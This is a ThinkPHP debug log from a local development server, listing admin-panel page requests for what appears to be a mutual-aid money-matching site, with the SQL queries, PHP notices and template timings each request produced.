SQL: SELECT * FROM `rrhbt2t8888_task` [ RunTime:0.0000s ]
SQL: SHOW CREATE TABLE `rrhbt2t8888_tgbz` [ RunTime:0.0010s ]
SQL: SELECT * FROM `rrhbt2t8888_tgbz` [ RunTime:0.0000s ]
SQL: SHOW CREATE TABLE `rrhbt2t8888_tixian` [ RunTime:0.0010s ]
SQL: SELECT * FROM `rrhbt2t8888_tixian` [ RunTime:0.0010s ]
SQL: SHOW CREATE TABLE `rrhbt2t8888_topup` [ RunTime:0.0010s ]
SQL: SELECT * FROM `rrhbt2t8888_topup` [ RunTime:0.0000s ]
SQL: SHOW CREATE TABLE `rrhbt2t8888_upfile` [ RunTime:0.0000s ]
SQL: SELECT * FROM `rrhbt2t8888_upfile` [ RunTime:0.0000s ]
SQL: SHOW CREATE TABLE `rrhbt2t8888_user` [ RunTime:0.0010s ]
SQL: SELECT * FROM `rrhbt2t8888_user` [ RunTime:0.0000s ]
SQL: SHOW CREATE TABLE `rrhbt2t8888_user_jj` [ RunTime:0.0000s ]
SQL: SELECT * FROM `rrhbt2t8888_user_jj` [ RunTime:0.0000s ]
SQL: SHOW CREATE TABLE `rrhbt2t8888_user_jl` [ RunTime:0.0000s ]
SQL: SELECT * FROM `rrhbt2t8888_user_jl` [ RunTime:0.0000s ]
SQL: SHOW CREATE TABLE `rrhbt2t8888_useraddr` [ RunTime:0.0010s ]
SQL: SELECT * FROM `rrhbt2t8888_useraddr` [ RunTime:0.0000s ]
SQL: SHOW CREATE TABLE `rrhbt2t8888_userget` [ RunTime:0.0000s ]
SQL: SELECT * FROM `rrhbt2t8888_userget` [ RunTime:0.0010s ]
SQL: SHOW CREATE TABLE `rrhbt2t8888_usergroup` [ RunTime:0.0010s ]
SQL: SELECT * FROM `rrhbt2t8888_usergroup` [ RunTime:0.0000s ]
SQL: SHOW CREATE TABLE `rrhbt2t8888_userinfo` [ RunTime:0.0010s ]
SQL: SELECT * FROM `rrhbt2t8888_userinfo` [ RunTime:0.0000s ]
SQL: SHOW CREATE TABLE `rrhbt2t8888_userjyinfo` [ RunTime:0.0010s ]
SQL: SELECT * FROM `rrhbt2t8888_userjyinfo` [ RunTime:0.0000s ]
SQL: SHOW CREATE TABLE `rrhbt2t8888_userlevel` [ RunTime:0.0020s ]
SQL: SELECT * FROM `rrhbt2t8888_userlevel` [ RunTime:0.0000s ]
SQL: SHOW CREATE TABLE `rrhbt2t8888_zsbyg_dd` [ RunTime:0.0010s ]
SQL: SELECT * FROM `rrhbt2t8888_zsbyg_dd` [ RunTime:0.0000s ]
INFO: [ view_parse ] --START--
INFO: [ template_filter ] --START--
INFO: Run Behavior\ContentReplaceBehavior [ RunTime:0.000000s ]
INFO: [ template_filter ] --END-- [ RunTime:0.000000s ]
INFO: Run Behavior\ParseTemplateBehavior [ RunTime:0.004000s ]
INFO: [ view_parse ] --END-- [ RunTime:0.005000s ]
INFO: [ view_filter ] --START--
INFO: Run Behavior\WriteHtmlCacheBehavior [ RunTime:0.000000s ]
INFO: [ view_filter ] --END-- [ RunTime:0.000000s ]
INFO: [ app_end ] --START--
INFO: Run Behavior\ShowPageTraceBehavior [ RunTime:0.001000s ]
INFO: [ app_end ] --END-- [ RunTime:0.001000s ]

[ 2017-02-14T17:17:50+08:00 ] 127.0.0.1 /shi.php/Home/Index/main.html
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000000s ]
INFO: [ app_begin ] --END-- [ RunTime:0.001000s ]
NOTIC: [8] Undefined index: all D:\www\huzhu\mingyingtianxia\snadmin\Home\Controller\CommonController.class.php ç¬¬ 15 è¡Œ.
INFO: [ view_parse ] --START--
INFO: [ template_filter ] --START--
INFO: Run Behavior\ContentReplaceBehavior [ RunTime:0.000000s ]
INFO: [ template_filter ] --END-- [ RunTime:0.001001s ]
INFO: Run Behavior\ParseTemplateBehavior [ RunTime:0.006001s ]
INFO: [ view_parse ] --END-- [ RunTime:0.007001s ]
INFO: [ view_filter ] --START--
INFO: Run Behavior\WriteHtmlCacheBehavior [ RunTime:0.000000s ]
INFO: [ view_filter ] --END-- [ RunTime:0.000000s ]
INFO: [ app_end ] --START--
INFO: Run Behavior\ShowPageTraceBehavior [ RunTime:0.001000s ]
INFO: [ app_end ] --END-- [ RunTime:0.001000s ]

[ 2017-02-14T17:17:50+08:00 ] 127.0.0.1 /shi.php/Home/Index/top.html
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.001000s ]
INFO: [ app_begin ] --END-- [ RunTime:0.001000s ]
NOTIC: [8] Undefined index: all D:\www\huzhu\mingyingtianxia\snadmin\Home\Controller\CommonController.class.php ç¬¬ 15 è¡Œ.
INFO: [ view_parse ] --START--
INFO: [ template_filter ] --START--
INFO: Run Behavior\ContentReplaceBehavior [ RunTime:0.000000s ]
INFO: [ template_filter ] --END-- [ RunTime:0.000000s ]
INFO: Run Behavior\ParseTemplateBehavior [ RunTime:0.009000s ]
INFO: [ view_parse ] --END-- [ RunTime:0.009000s ]
INFO: [ view_filter ] --START--
INFO: Run Behavior\WriteHtmlCacheBehavior [ RunTime:0.000000s ]
INFO: [ view_filter ] --END-- [ RunTime:0.000000s ]
INFO: [ app_end ] --START--
INFO: Run Behavior\ShowPageTraceBehavior [ RunTime:0.000000s ]
INFO: [ app_end ] --END-- [ RunTime:0.000000s ]

[ 2017-02-14T17:17:51+08:00 ] 127.0.0.1 /shi.php/Home/Index/df1
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000000s ]
INFO: [ app_begin ] --END-- [ RunTime:0.002000s ]
NOTIC: [8] Undefined index: all D:\www\huzhu\mingyingtianxia\snadmin\Home\Controller\CommonController.class.php ç¬¬ 15 è¡Œ.
SQL: SHOW COLUMNS FROM `rrhbt2t8888_system` [ RunTime:0.0070s ]
SQL: SELECT * FROM `rrhbt2t8888_system` WHERE `SYS_ID` = 1 LIMIT 1   [ RunTime:0.0010s ]
SQL: SHOW COLUMNS FROM `rrhbt2t8888_drrz` [ RunTime:0.0050s ]
SQL: SELECT * FROM `rrhbt2t8888_drrz` WHERE `user` = 'admin' AND `leixin` = 1 ORDER BY id DESC LIMIT 2   [ RunTime:0.0020s ]
NOTIC: [8] Undefined offset: 1 D:\www\huzhu\mingyingtianxia\snadmin\Home\Controller\IndexController.class.php ç¬¬ 50 è¡Œ.
SQL: SHOW COLUMNS FROM `rrhbt2t8888_user` [ RunTime:0.0060s ]
SQL: SELECT COUNT(UE_ID) AS tp_count FROM `rrhbt2t8888_user` WHERE ( `UE_regTime`> '2017-02-14 00:00:00' AND `UE_regTime` < '2017-02-14 23:59:59' ) LIMIT 1   [ RunTime:0.0000s ]
SQL: SELECT COUNT(UE_ID) AS tp_count FROM `rrhbt2t8888_user` WHERE ( `UE_activeTime`> '2017-02-14 00:00:00' AND `UE_activeTime` < '2017-02-14 23:59:59' ) LIMIT 1   [ RunTime:0.0000s ]
SQL: SELECT COUNT(UE_ID) AS tp_count FROM `rrhbt2t8888_user` WHERE ( `UE_regTime`> '2017-02-13 00:00:00' AND `UE_regTime` < '2017-02-13 23:59:59' ) LIMIT 1   [ RunTime:0.0010s ]
SQL: SELECT COUNT(UE_ID) AS tp_count FROM `rrhbt2t8888_user` WHERE ( `UE_activeTime`> '2017-02-13 00:00:00' AND `UE_activeTime` < '2017-02-13 23:59:59' ) LIMIT 1   [ RunTime:0.0000s ]
SQL: SELECT COUNT(UE_ID) AS tp_count FROM `rrhbt2t8888_user` WHERE ( `UE_ID`> '0' ) LIMIT 1   [ RunTime:0.0000s ]
SQL: SELECT COUNT(UE_ID) AS tp_count FROM `rrhbt2t8888_user` WHERE ( `UE_ID`> '0' AND `UE_check` = '1' ) LIMIT 1   [ RunTime:0.0010s ]
SQL: SELECT COUNT(UE_ID) AS tp_count FROM `rrhbt2t8888_user` WHERE ( `UE_ID`> '0' AND `UE_check` = '1' AND `UE_stop` = '0' ) LIMIT 1   [ RunTime:0.0000s ]
SQL: SELECT SUM(UE_money) AS tp_sum FROM `rrhbt2t8888_user` LIMIT 1   [ RunTime:0.0000s ]
SQL: SELECT SUM(ybhe) AS tp_sum FROM `rrhbt2t8888_user` LIMIT 1   [ RunTime:0.0010s ]
SQL: SELECT SUM(zsbhe) AS tp_sum FROM `rrhbt2t8888_user` LIMIT 1   [ RunTime:0.0000s ]
INFO: [ view_parse ] --START--
INFO: [ template_filter ] --START--
INFO: Run Behavior\ContentReplaceBehavior [ RunTime:0.000000s ]
INFO: [ template_filter ] --END-- [ RunTime:0.000000s ]
INFO: Run Behavior\ParseTemplateBehavior [ RunTime:0.006000s ]
INFO: [ view_parse ] --END-- [ RunTime:0.006000s ]
INFO: [ view_filter ] --START--
INFO: Run Behavior\WriteHtmlCacheBehavior [ RunTime:0.000000s ]
INFO: [ view_filter ] --END-- [ RunTime:0.000000s ]
INFO: [ app_end ] --START--
INFO: Run Behavior\ShowPageTraceBehavior [ RunTime:0.000000s ]
INFO: [ app_end ] --END-- [ RunTime:0.000000s ]

[ 2017-02-14T17:17:52+08:00 ] 127.0.0.1 /shi.php/Home/Index/left.html
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000000s ]
INFO: [ app_begin ] --END-- [ RunTime:0.001000s ]
NOTIC: [8] Undefined index: all D:\www\huzhu\mingyingtianxia\snadmin\Home\Controller\CommonController.class.php ç¬¬ 15 è¡Œ.
INFO: [ view_parse ] --START--
INFO: [ template_filter ] --START--
INFO: Run Behavior\ContentReplaceBehavior [ RunTime:0.000000s ]
INFO: [ template_filter ] --END-- [ RunTime:0.000000s ]
INFO: Run Behavior\ParseTemplateBehavior [ RunTime:0.014001s ]
INFO: [ view_parse ] --END-- [ RunTime:0.014001s ]
INFO: [ view_filter ] --START--
INFO: Run Behavior\WriteHtmlCacheBehavior [ RunTime:0.000000s ]
INFO: [ view_filter ] --END-- [ RunTime:0.000000s ]
INFO: [ app_end ] --START--
INFO: Run Behavior\ShowPageTraceBehavior [ RunTime:0.001000s ]
INFO: [ app_end ] --END-- [ RunTime:0.001000s ]

[ 2017-02-14T17:17:56+08:00 ] 127.0.0.1 /shi.php/Home/Index/tgbz_list
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.001000s ]
INFO: [ app_begin ] --END-- [ RunTime:0.001000s ]
NOTIC: [8] Undefined index: all D:\www\huzhu\mingyingtianxia\snadmin\Home\Controller\CommonController.class.php ç¬¬ 15 è¡Œ.
SQL: SHOW COLUMNS FROM `rrhbt2t8888_tgbz` [ RunTime:0.0050s ]
SQL: SELECT SUM(jb) AS tp_sum FROM `rrhbt2t8888_tgbz` LIMIT 1   [ RunTime:0.0010s ]
SQL: SELECT SUM(jb) AS tp_sum FROM `rrhbt2t8888_tgbz` WHERE `zt` = 1 LIMIT 1   [ RunTime:0.0000s ]
SQL: SELECT SUM(jb) AS tp_sum FROM `rrhbt2t8888_tgbz` WHERE `zt` <> 1 LIMIT 1   [ RunTime:0.0010s ]
SQL: SELECT SUM(jb) AS tp_sum FROM `rrhbt2t8888_tgbz` WHERE ( `date`> '2017-02-14 00:00:00' AND `date` < '2017-02-14 23:59:59' ) LIMIT 1   [ RunTime:0.0000s ]
SQL: SELECT COUNT(*) AS tp_count FROM `rrhbt2t8888_tgbz` WHERE `zt` <= 0 LIMIT 1   [ RunTime:0.0000s ]
SQL: SELECT * FROM `rrhbt2t8888_tgbz` WHERE `zt` <= 0 ORDER BY date  LIMIT 0,20   [ RunTime:0.0000s ]
INFO: [ view_parse ] --START--
INFO: [ template_filter ] --START--
INFO: Run Behavior\ContentReplaceBehavior [ RunTime:0.000000s ]
INFO: [ template_filter ] --END-- [ RunTime:0.001000s ]
INFO: Run Behavior\ParseTemplateBehavior [ RunTime:0.026002s ]
INFO: [ view_parse ] --END-- [ RunTime:0.026002s ]
INFO: [ view_filter ] --START--
INFO: Run Behavior\WriteHtmlCacheBehavior [ RunTime:0.000000s ]
INFO: [ view_filter ] --END-- [ RunTime:0.001000s ]
INFO: [ app_end ] --START--
INFO: Run Behavior\ShowPageTraceBehavior [ RunTime:0.000000s ]
INFO: [ app_end ] --END-- [ RunTime:0.000000s ]

[ 2017-02-14T17:17:57+08:00 ] 127.0.0.1 /shi.php/Home/Index/ppdd_list
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000000s ]
INFO: [ app_begin ] --END-- [ RunTime:0.001000s ]
NOTIC: [8] Undefined index: all D:\www\huzhu\mingyingtianxia\snadmin\Home\Controller\CommonController.class.php ç¬¬ 15 è¡Œ.
SQL: SHOW COLUMNS FROM `rrhbt2t8888_ppdd` [ RunTime:0.0060s ]
SQL: SELECT COUNT(*) AS tp_count FROM `rrhbt2t8888_ppdd` WHERE `zt` <> 2 LIMIT 1   [ RunTime:0.0000s ]
SQL: SELECT * FROM `rrhbt2t8888_ppdd` WHERE `zt` <> 2 ORDER BY date  LIMIT 0,20   [ RunTime:0.0000s ]
INFO: [ view_parse ] --START--
INFO: [ template_filter ] --START--
INFO: Run Behavior\ContentReplaceBehavior [ RunTime:0.000000s ]
INFO: [ template_filter ] --END-- [ RunTime:0.000000s ]
INFO: Run Behavior\ParseTemplateBehavior [ RunTime:0.016001s ]
INFO: [ view_parse ] --END-- [ RunTime:0.016001s ]
INFO: [ view_filter ] --START--
INFO: Run Behavior\WriteHtmlCacheBehavior [ RunTime:0.000000s ]
INFO: [ view_filter ] --END-- [ RunTime:0.000000s ]
INFO: [ app_end ] --START--
INFO: Run Behavior\ShowPageTraceBehavior [ RunTime:0.000000s ]
INFO: [ app_end ] --END-- [ RunTime:0.000000s ]

[ 2017-02-14T17:17:58+08:00 ] 127.0.0.1 /shi.php/Home/Index/ppdd_list/cz/1/
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.001000s ]
INFO: [ app_begin ] --END-- [ RunTime:0.001000s ]
NOTIC: [8] Undefined index: all D:\www\huzhu\mingyingtianxia\snadmin\Home\Controller\CommonController.class.php ç¬¬ 15 è¡Œ.
SQL: SHOW COLUMNS FROM `rrhbt2t8888_ppdd` [ RunTime:0.0060s ]
SQL: SELECT COUNT(*) AS tp_count FROM `rrhbt2t8888_ppdd` WHERE `zt` = 2 LIMIT 1   [ RunTime:0.0010s ]
SQL: SELECT * FROM `rrhbt2t8888_ppdd` WHERE `zt` = 2 ORDER BY date  LIMIT 0,20   [ RunTime:0.0000s ]
INFO: [ view_parse ] --START--
INFO: [ template_filter ] --START--
INFO: Run Behavior\ContentReplaceBehavior [ RunTime:0.000000s ]
INFO: [ template_filter ] --END-- [ RunTime:0.001000s ]
INFO: Run Behavior\ParseTemplateBehavior [ RunTime:0.007001s ]
INFO: [ view_parse ] --END-- [ RunTime:0.007001s ]
INFO: [ view_filter ] --START--
INFO: Run Behavior\WriteHtmlCacheBehavior [ RunTime:0.000000s ]
INFO: [ view_filter ] --END-- [ RunTime:0.001000s ]
INFO: [ app_end ] --START--
INFO: Run Behavior\ShowPageTraceBehavior [ RunTime:0.000000s ]
INFO: [ app_end ] --END-- [ RunTime:0.000000s ]

[ 2017-02-14T17:17:58+08:00 ] 127.0.0.1 /shi.php/Home/Index/ts1_list
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.001000s ]
INFO: [ app_begin ] --END-- [ RunTime:0.002000s ]
NOTIC: [8] Undefined index: all D:\www\huzhu\mingyingtianxia\snadmin\Home\Controller\CommonController.class.php ç¬¬ 15 è¡Œ.
SQL: SHOW COLUMNS FROM `rrhbt2t8888_ppdd` [ RunTime:0.0060s ]
SQL: SELECT COUNT(*) AS tp_count FROM `rrhbt2t8888_ppdd` WHERE (  zt != 2 and TIMESTAMPDIFF(HOUR,date,'2017-02-14 17:17:58') > 1 ) LIMIT 1   [ RunTime:0.0000s ]
SQL: SELECT * FROM `rrhbt2t8888_ppdd` WHERE (  zt != 2 and TIMESTAMPDIFF(HOUR,date,'2017-02-14 17:17:58') > 1 ) ORDER BY id DESC LIMIT 0,20   [ RunTime:0.0000s ]
INFO: [ view_parse ] --START--
INFO: [ template_filter ] --START--
INFO: Run Behavior\ContentReplaceBehavior [ RunTime:0.000000s ]
INFO: [ template_filter ] --END-- [ RunTime:0.000000s ]
INFO: Run Behavior\ParseTemplateBehavior [ RunTime:0.022002s ]
INFO: [ view_parse ] --END-- [ RunTime:0.022002s ]
INFO: [ view_filter ] --START--
INFO: Run Behavior\WriteHtmlCacheBehavior [ RunTime:0.000000s ]
INFO: [ view_filter ] --END-- [ RunTime:0.000000s ]
INFO: [ app_end ] --START--
INFO: Run Behavior\ShowPageTraceBehavior [ RunTime:0.000000s ]
INFO: [ app_end ] --END-- [ RunTime:0.001000s ]

[ 2017-02-14T17:17:58+08:00 ] 127.0.0.1 /shi.php/Home/Index/ts3_list
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.001001s ]
INFO: [ app_begin ] --END-- [ RunTime:0.001001s ]
NOTIC: [8] Undefined index: all D:\www\huzhu\mingyingtianxia\snadmin\Home\Controller\CommonController.class.php ç¬¬ 15 è¡Œ.
SQL: SHOW COLUMNS FROM `rrhbt2t8888_ppdd` [ RunTime:0.0060s ]
SQL: SELECT COUNT(*) AS tp_count FROM `rrhbt2t8888_ppdd` WHERE `zt` <> 2 AND `ts_zt` = 2 LIMIT 1   [ RunTime:0.0010s ]
SQL: SELECT * FROM `rrhbt2t8888_ppdd` WHERE `zt` <> 2 AND `ts_zt` = 2 ORDER BY id DESC LIMIT 0,20   [ RunTime:0.0010s ]
INFO: [ view_parse ] --START--
INFO: [ template_filter ] --START--
INFO: Run Behavior\ContentReplaceBehavior [ RunTime:0.000000s ]
INFO: [ template_filter ] --END-- [ RunTime:0.000000s ]
INFO: Run Behavior\ParseTemplateBehavior [ RunTime:0.024002s ]
INFO: [ view_parse ] --END-- [ RunTime:0.024002s ]
INFO: [ view_filter ] --START--
INFO: Run Behavior\WriteHtmlCacheBehavior [ RunTime:0.000000s ]
INFO: [ view_filter ] --END-- [ RunTime:0.000000s ]
INFO: [ app_end ] --START--
INFO: Run Behavior\ShowPageTraceBehavior [ RunTime:0.001000s ]
INFO: [ app_end ] --END-- [ RunTime:0.001000s ]

[ 2017-02-14T17:17:59+08:00 ] 127.0.0.1 /shi.php/Home/Index/jjset
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000000s ]
INFO: [ app_begin ] --END-- [ RunTime:0.001001s ]
NOTIC: [8] Undefined index: all D:\www\huzhu\mingyingtianxia\snadmin\Home\Controller\CommonController.class.php ç¬¬ 15 è¡Œ.
INFO: [ view_parse ] --START--
INFO: [ template_filter ] --START--
INFO: Run Behavior\ContentReplaceBehavior [ RunTime:0.000000s ]
INFO: [ template_filter ] --END-- [ RunTime:0.000000s ]
INFO: Run Behavior\ParseTemplateBehavior [ RunTime:0.010000s ]
INFO: [ view_parse ] --END-- [ RunTime:0.010000s ]
INFO: [ view_filter ] --START--
INFO: Run Behavior\WriteHtmlCacheBehavior [ RunTime:0.000000s ]
INFO: [ view_filter ] --END-- [ RunTime:0.000000s ]
INFO: [ app_end ] --START--
INFO: Run Behavior\ShowPageTraceBehavior [ RunTime:0.001000s ]
INFO: [ app_end ] --END-- [ RunTime:0.003001s ]

[ 2017-02-14T17:18:00+08:00 ] 127.0.0.1 /shi.php/Home/Index/txset
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.001000s ]
INFO: [ app_begin ] --END-- [ RunTime:0.001000s ]
NOTIC: [8] Undefined index: all D:\www\huzhu\mingyingtianxia\snadmin\Home\Controller\CommonController.class.php ç¬¬ 15 è¡Œ.
INFO: [ view_parse ] --START--
INFO: [ template_filter ] --START--
INFO: Run Behavior\ContentReplaceBehavior [ RunTime:0.000000s ]
INFO: [ template_filter ] --END-- [ RunTime:0.000000s ]
INFO: Run Behavior\ParseTemplateBehavior [ RunTime:0.006001s ]
INFO: [ view_parse ] --END-- [ RunTime:0.006001s ]
INFO: [ view_filter ] --START--
INFO: Run Behavior\WriteHtmlCacheBehavior [ RunTime:0.000000s ]
INFO: [ view_filter ] --END-- [ RunTime:0.000000s ]
INFO: [ app_end ] --START--
INFO: Run Behavior\ShowPageTraceBehavior [ RunTime:0.001000s ]
INFO: [ app_end ] --END-- [ RunTime:0.001000s ]

[ 2017-02-14T17:18:00+08:00 ] 127.0.0.1 /shi.php/Home/Common/getTree
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000000s ]
INFO: [ app_begin ] --END-- [ RunTime:0.000000s ]
NOTIC: [8] Undefined index: all D:\www\huzhu\mingyingtianxia\snadmin\Home\Controller\CommonController.class.php ç¬¬ 15 è¡Œ.
INFO: [ app_end ] --START--
INFO: Run Behavior\ShowPageTraceBehavior [ RunTime:0.001000s ]
INFO: [ app_end ] --END-- [ RunTime:0.001000s ]

[ 2017-02-14T17:18:00+08:00 ] 127.0.0.1 /shi.php/Home/Index/lixi
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.001000s ]
INFO: [ app_begin ] --END-- [ RunTime:0.001000s ]
NOTIC: [8] Undefined index: all D:\www\huzhu\mingyingtianxia\snadmin\Home\Controller\CommonController.class.php ç¬¬ 15 è¡Œ.
INFO: [ view_parse ] --START--
INFO: [ template_filter ] --START--
INFO: Run Behavior\ContentReplaceBehavior [ RunTime:0.000000s ]
INFO: [ template_filter ] --END-- [ RunTime:0.000000s ]
INFO: Run Behavior\ParseTemplateBehavior [ RunTime:0.006001s ]
INFO: [ view_parse ] --END-- [ RunTime:0.006001s ]
INFO: [ view_filter ] --START--
INFO: Run Behavior\WriteHtmlCacheBehavior [ RunTime:0.000000s ]
INFO: [ view_filter ] --END-- [ RunTime:0.000000s ]
INFO: [ app_end ] --START--
INFO: Run Behavior\ShowPageTraceBehavior [ RunTime:0.001000s ]
INFO: [ app_end ] --END-- [ RunTime:0.001000s ]

[ 2017-02-14T17:18:01+08:00 ] 127.0.0.1 /shi.php/Home/Index/conf
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.001000s ]
INFO: [ app_begin ] --END-- [ RunTime:0.001000s ]
NOTIC: [8] Undefined index: all D:\www\huzhu\mingyingtianxia\snadmin\Home\Controller\CommonController.class.php ç¬¬ 15 è¡Œ.
INFO: [ view_parse ] --START--
INFO: [ template_filter ] --START--
INFO: Run Behavior\ContentReplaceBehavior [ RunTime:0.000000s ]
INFO: [ template_filter ] --END-- [ RunTime:0.000000s ]
INFO: Run Behavior\ParseTemplateBehavior [ RunTime:0.007000s ]
INFO: [ view_parse ] --END-- [ RunTime:0.007000s ]
INFO: [ view_filter ] --START--
INFO: Run Behavior\WriteHtmlCacheBehavior [ RunTime:0.001000s ]
INFO: [ view_filter ] --END-- [ RunTime:0.001000s ]
INFO: [ app_end ] --START--
INFO: Run Behavior\ShowPageTraceBehavior [ RunTime:0.001000s ]
INFO: [ app_end ] --END-- [ RunTime:0.001000s ]

[ 2017-02-14T17:18:05+08:00 ] 127.0.0.1 /shi.php/Home/Index/lixi
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.001000s ]
INFO: [ app_begin ] --END-- [ RunTime:0.001000s ]
NOTIC: [8] Undefined index: all D:\www\huzhu\mingyingtianxia\snadmin\Home\Controller\CommonController.class.php ç¬¬ 15 è¡Œ.
INFO: [ view_parse ] --START--
INFO: [ template_filter ] --START--
INFO: Run Behavior\ContentReplaceBehavior [ RunTime:0.000000s ]
INFO: [ template_filter ] --END-- [ RunTime:0.000000s ]
INFO: Run Behavior\ParseTemplateBehavior [ RunTime:0.007000s ]
INFO: [ view_parse ] --END-- [ RunTime:0.007000s ]
INFO: [ view_filter ] --START--
INFO: Run Behavior\WriteHtmlCacheBehavior [ RunTime:0.000000s ]
INFO: [ view_filter ] --END-- [ RunTime:0.000000s ]
INFO: [ app_end ] --START--
INFO: Run Behavior\ShowPageTraceBehavior [ RunTime:0.001000s ]
INFO: [ app_end ] --END-- [ RunTime:0.001000s ]

[ 2017-02-14T17:18:06+08:00 ] 127.0.0.1 /shi.php/Home/Index/pai_add
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.001000s ]
INFO: [ app_begin ] --END-- [ RunTime:0.001000s ]
NOTIC: [8] Undefined index: all D:\www\huzhu\mingyingtianxia\snadmin\Home\Controller\CommonController.class.php ç¬¬ 15 è¡Œ.
INFO: [ view_parse ] --START--
INFO: [ template_filter ] --START--
INFO: Run Behavior\ContentReplaceBehavior [ RunTime:0.000000s ]
INFO: [ template_filter ] --END-- [ RunTime:0.000000s ]
NOTIC: [8] Undefined variable: page D:\www\huzhu\mingyingtianxia\snadmin\Runtime\Cache\Home\42c5ce84da4fe154afb50a59072224cd.php ç¬¬ 107 è¡Œ.
INFO: Run Behavior\ParseTemplateBehavior [ RunTime:0.024002s ]
INFO: [ view_parse ] --END-- [ RunTime:0.024002s ]
INFO: [ view_filter ] --START--
INFO: Run Behavior\WriteHtmlCacheBehavior [ RunTime:0.000000s ]
INFO: [ view_filter ] --END-- [ RunTime:0.000000s ]
INFO: [ app_end ] --START--
INFO: Run Behavior\ShowPageTraceBehavior [ RunTime:0.001000s ]
INFO: [ app_end ] --END-- [ RunTime:0.001000s ]

[ 2017-02-14T17:18:07+08:00 ] 127.0.0.1 /shi.php/Home/Index/pai_list
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000000s ]
INFO: [ app_begin ] --END-- [ RunTime:0.000000s ]
NOTIC: [8] Undefined index: all D:\www\huzhu\mingyingtianxia\snadmin\Home\Controller\CommonController.class.php ç¬¬ 15 è¡Œ.
SQL: SHOW COLUMNS FROM `rrhbt2t8888_pai` [ RunTime:0.0050s ]
SQL: SELECT COUNT(*) AS tp_count FROM `rrhbt2t8888_pai` LIMIT 1   [ RunTime:0.0010s ]
SQL: SELECT COUNT(*) AS tp_count FROM `rrhbt2t8888_pai` WHERE `zt` = 0 LIMIT 1   [ RunTime:0.0000s ]
SQL: SELECT * FROM `rrhbt2t8888_pai` WHERE `zt` = 0 ORDER BY id DESC LIMIT 0,20   [ RunTime:0.0000s ]
INFO: [ view_parse ] --START--
INFO: [ template_filter ] --START--
INFO: Run Behavior\ContentReplaceBehavior [ RunTime:0.000000s ]
INFO: [ template_filter ] --END-- [ RunTime:0.000000s ]
INFO: Run Behavior\ParseTemplateBehavior [ RunTime:0.021001s ]
INFO: [ view_parse ] --END-- [ RunTime:0.021001s ]
INFO: [ view_filter ] --START--
INFO: Run Behavior\WriteHtmlCacheBehavior [ RunTime:0.000000s ]
INFO: [ view_filter ] --END-- [ RunTime:0.000000s ]
INFO: [ app_end ] --START--
INFO: Run Behavior\ShowPageTraceBehavior [ RunTime:0.001000s ]
INFO: [ app_end ] --END-- [ RunTime:0.001000s ]

[ 2017-02-14T17:18:08+08:00 ] 127.0.0.1 /shi.php/Home/Index/pin_add
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.001000s ]
INFO: [ app_begin ] --END-- [ RunTime:0.001000s ]
NOTIC: [8] Undefined index: all D:\www\huzhu\mingyingtianxia\snadmin\Home\Controller\CommonController.class.php ç¬¬ 15 è¡Œ.
INFO: [ view_parse ] --START--
INFO: [ template_filter ] --START--
INFO: Run Behavior\ContentReplaceBehavior [ RunTime:0.000000s ]
INFO: [ template_filter ] --END-- [ RunTime:0.000000s ]
NOTIC: [8] Undefined variable: page D:\www\huzhu\mingyingtianxia\snadmin\Runtime\Cache\Home\c57dd95c4c85874edcc04d830e0d78f8.php ç¬¬ 107 è¡Œ.
INFO: Run Behavior\ParseTemplateBehavior [ RunTime:0.020002s ]
INFO: [ view_parse ] --END-- [ RunTime:0.020002s ]
INFO: [ view_filter ] --START--
INFO: Run Behavior\WriteHtmlCacheBehavior [ RunTime:0.000000s ]
INFO: [ view_filter ] --END-- [ RunTime:0.000000s ]
INFO: [ app_end ] --START--
INFO: Run Behavior\ShowPageTraceBehavior [ RunTime:0.001000s ]
INFO: [ app_end ] --END-- [ RunTime:0.001000s ]

[ 2017-02-14T17:18:09+08:00 ] 127.0.0.1 /shi.php/Home/Index/pin_list
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.001000s ]
INFO: [ app_begin ] --END-- [ RunTime:0.001000s ]
NOTIC: [8] Undefined index: all D:\www\huzhu\mingyingtianxia\snadmin\Home\Controller\CommonController.class.php ç¬¬ 15 è¡Œ.
SQL: SHOW COLUMNS FROM `rrhbt2t8888_pin` [ RunTime:0.0050s ]
SQL: SELECT COUNT(*) AS tp_count FROM `rrhbt2t8888_pin` LIMIT 1   [ RunTime:0.0000s ]
SQL: SELECT COUNT(*) AS tp_count FROM `rrhbt2t8888_pin` WHERE `zt` = 0 LIMIT 1   [ RunTime:0.0000s ]
SQL: SELECT * FROM `rrhbt2t8888_pin` WHERE `zt` = 0 ORDER BY id DESC LIMIT 0,20   [ RunTime:0.0000s ]
INFO: [ view_parse ] --START--
INFO: [ template_filter ] --START--
INFO: Run Behavior\ContentReplaceBehavior [ RunTime:0.000000s ]
INFO: [ template_filter ] --END-- [ RunTime:0.000000s ]
INFO: Run Behavior\ParseTemplateBehavior [ RunTime:0.022001s ]
